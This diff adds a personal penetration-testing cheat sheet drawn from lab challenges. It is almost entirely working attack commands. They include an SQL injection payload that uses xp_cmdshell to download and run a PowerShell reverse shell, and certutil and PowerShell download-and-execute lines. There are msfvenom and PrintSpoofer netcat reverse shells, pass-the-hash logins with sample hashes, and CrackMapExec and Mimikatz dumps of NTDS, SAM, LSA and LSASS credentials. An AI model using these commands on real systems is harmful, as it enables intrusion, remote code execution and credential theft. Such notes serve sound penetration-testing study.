@@ -1,0 +1,124 @@
+Syntax from Challenges
+
+RCE Through SQLi for Windows
+
+	Admin+'%3b+EXEC+xp_cmdshell+"powershell.exe+-c+IEX(New-Object+Net.WebClient).DownloadString('http%3a//192.168.45.177/reverse.ps1')+"%3b--
+
+RCE Through SQLi for Linux
+
+	TODO
+
+File Transfer
+	CMD&Powershell
+		certutil.exe -urlcache -split -f http://192.168.45.219/Database.kdbx Database.kdbx
+	Powershell
+		IEX (New-Object Net.Webclient).downloadString('http://10.10.10.10/Invoke-PowershellTcp.ps1')`
+		iwr -uri http://192.168.45.229/met.exe -Outfile met.exe
+
+msfvenom exec
+
+	msfvenom -p windows/x64/exec cmd='C:\Windows\System32\spool\drivers\color\nc.exe 192.168.45.188 9003 -e cmd' -f exe -o 121.exe
+
+
+smbclient solid syntax
+	
+	smbclient //172.16.76.21/monitoring -U relia.com//mountuser%'DRtajyCwcbWvH/9'
+
+Pass The Hash
+
+	smbclient pth
+
+		smbclient //172.16.219.83/Windows -U joe --pw-nt-hash 08d7a47a6f9f66b97b1bae4178747494 -W medtech.com
+
+	xfreerdp pth
+
+		xfreerdp /v:172.16.219.12 /u:yoshi /pth:fdf36048c1cf88f5630381c5e38feb8e /cert:ignore +clipboard /dynamic-resolution /d:medtech.com
+
+	LM portion : in case you need it ,here it is aad3b435b51404eeaad3b435b51404ee ,or you can fill it with 32 0s
+
+	pth-winexe (try this one after imapcket) (just type `pth` and discover the tools we have.)
+
+		pth-winexe -U <domain/username>%<hash> //<targetIP> cmd.exe
+
+Enable stuff :
+	rdp  : Enable-PSRemoting
+	winrm: winrm quickconfig
+
+
+CrackMapExec
+	Dump the NTDS.dit from target DC 
+		cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
+	    cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
+
+	Dump SAM hashes
+		cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
+
+	Dump LSA secrets
+		cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
+
+	Dump LSASS hashes
+		cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' -M lsassy
+
+	Dump NTDS with ntdsutil
+		netexec smb manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef -M ntdsutil
+		
+	Dump the NTDS.dit password history from target DC
+		cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
+
+	Show the pwdLastSet attribute for each NTDS.dit account
+		cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
+
+	File Download From The Target
+		cme smb 192.168.194.248 -u administrator -H 56e4633688c0fdd57c610faf9d7ab8df --get-file '\transfer\DB-back (1)\New Folder\Emma\Documents\Database.kdbx' Database.kdbx
+
+	File upload To The Target
+		cme smb 172.16.251.152 -u user -p pass --put-file /tmp/whoami.txt \\Windows\\Temp\\whoami.txt
+
+Potatoes Syntax
+	JuicyPotatoNG
+		.\JuicyPotatoNG.exe -t * -p "C:\windows\system32\cmd.exe" -a "/c whoami"
+	GodPotato
+		.\GodPotato-NET4.exe -cmd "cmd /c whoami"
+	PrintSpoofer 
+		.\PrintSpoofer.exe -c "C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd"
+
+
+ldap : 
+
+	- To dump usernames : ldapsearch -x -H ldap://192.168.240.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName
+	- To dump more details : ldapsearch -x -H ldap://192.168.240.122 -s sub -b 'DC=hutch,DC=offsec'
+	- To dump other details : ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.240.122"
+	Note : save ip to /etc/hosts ,first DC is machine name second one is extention like .local or .THM
+
+snmp : 
+	Regular scan : 
+	this shit.... took me a while to find this.. It will give you hidden details ,if there is
+	snmpwalk -v2c -c public 192.168.206.156  NET-SNMP-EXTEND-MIB::nsExtendObjects
+	it works with -v1 as well
+
+bloodhound:
+	Remotely: /opt/BloodHound.py/bloodhound.py -d heist.offsec -u enox -p california -c all -ns 192.168.152.165 (no zip is created ,just upload the json files)
+	Locally : ./SharpHound.exe --CollectionMethod All,GPOLocalGroup,LoggedOn
+
+Services :
+	Getting all Running services
+		Get-Service | Where-Object -Property Status -EQ Running
+		OR
+		Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
+Quick Tips :
+	-(Alternative to tree command) find . | sed -e "s/[^-][^\/]*\// |/g" -e "s/|\([^ ]\)/|-\1/"
+	-Getting current system architecture : dpkg --print-architecture
+	-If you pwned a wordpress site and you uploaded your shell into 404.php here's the curl : curl http://$ip/wp-content/themes/twentyseventeen/404.php
+	-If you see tcpdump is installed check the result of tcpdump via live scan. It might include a password : sudo tcpdump -i lo -A | grep "pass"
+	-(bruteforcing smb via hydra) hydra -l [user] -P [wordlist] smb://[target]/[user] (UNTESTED)
+	-Use /home/kali/THM/PrivESc/Windows/creddump7/pwdump.py against SAM and SYSTEM in case secretsdump doesn't work.
+
+
+
+Important Notes : 
+
+- If you have LFI ,you can execute php files via directory traversal.
+- THIS ONE CAN SAVE YOUR 1 TIME MSF RIGHT : IF YOU'RE RUNNING MIMIKATZ WITH ADMIN BUT STILL IT'S ERRORS OUT (example kuhl) USE : `lsadump::lsa /inject` after privilege::debug , token::elevate. IT WORKS LIKE MAGIC
+
+check this later on
+powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
